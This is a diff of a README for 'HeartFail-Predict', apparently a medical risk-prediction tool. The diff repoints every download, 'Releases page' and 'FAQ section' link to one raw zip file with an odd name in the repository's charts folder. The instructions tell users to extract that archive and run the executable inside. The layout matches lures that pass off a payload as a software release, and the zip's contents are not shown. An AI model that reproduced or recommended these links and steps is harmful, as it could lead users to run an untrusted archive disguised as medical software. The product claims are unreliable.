@@ -1,7 +1,7 @@
 # 🫀 HeartFail-Predict - Predict Cardiac Risks Easily
 
 ## 📥 Download Now
-[![Download HeartFail-Predict](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip%20Now-HeartFail--Predict-brightgreen)](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip)
+[![Download HeartFail-Predict](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip%20Now-HeartFail--Predict-brightgreen)](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip)
 
 ## 📘 Overview
 HeartFail-Predict is a powerful tool that helps predict in-hospital cardiac mortality. It uses advanced machine learning techniques to analyze routine blood tests and echo results. Based on real data from 15,757 Indian patients, it achieves an impressive AUC of 0.977. This means it can identify at-risk patients effectively.
@@ -22,11 +22,11 @@ Here’s how you can download and run HeartFail-Predict.
 - Internet Connection: Required for the initial download
 
 ### 🔗 Download & Install
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip) to download the latest version of HeartFail-Predict. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip) to download the latest version of HeartFail-Predict. 
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip).
 2. You will see a list of available versions. Choose the latest release.
-3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .app for macOS, or https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip for Linux).
+3. Click on the appropriate file for your operating system (e.g., .exe for Windows, .app for macOS, or https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip for Linux).
 
 After downloading the file, follow these simple steps to install:
 
@@ -39,7 +39,7 @@ After downloading the file, follow these simple steps to install:
   2. Drag the HeartFail-Predict icon to your Applications folder.
 
 - **For Linux:**
-  1. Extract the https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip file.
+  1. Extract the https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip file.
   2. Open your terminal and navigate to the extracted folder.
   3. Run the command `./HeartFail-Predict`.
 
@@ -57,7 +57,7 @@ The dashboard should open in your web browser, ready for you to use.
 3. **Review Results:** The application will display the outcome within seconds.
 
 ## 💬 Support
-If you need assistance, please check the [FAQ section](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Fail-Predict-Heart-1.8.zip) or open an issue on GitHub. We appreciate your feedback and are happy to help.
+If you need assistance, please check the [FAQ section](https://raw.githubusercontent.com/Bonnelselme/HeartFail-Predict/main/charts/Heart_Fail_Predict_disinfeudation.zip) or open an issue on GitHub. We appreciate your feedback and are happy to help.
 
 ## 🛡️ License
 HeartFail-Predict is open-source software licensed under the MIT License. You can use it freely.
